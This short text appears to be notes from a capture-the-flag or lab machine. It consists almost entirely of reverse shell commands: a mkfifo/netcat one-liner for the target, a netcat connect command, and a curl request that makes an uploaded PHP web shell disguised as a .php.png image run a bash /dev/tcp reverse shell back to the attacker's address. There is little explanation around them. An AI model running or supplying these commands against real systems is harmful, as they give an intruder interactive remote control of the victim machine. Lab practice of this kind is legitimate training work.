On the target machine run 

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip attacking box} {some port} > /tmp/f
```

On your host machine run

```
nc -nv {ip attacking box} {some port}
```

A `curl` sent locally, which executes the command `bash` on the victim ip, which redirects back to our local listener on port `1234`.

```
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.207/1234 0>&1"' http://10.129.113.34/uploads/10_10_14_207.php.png
```

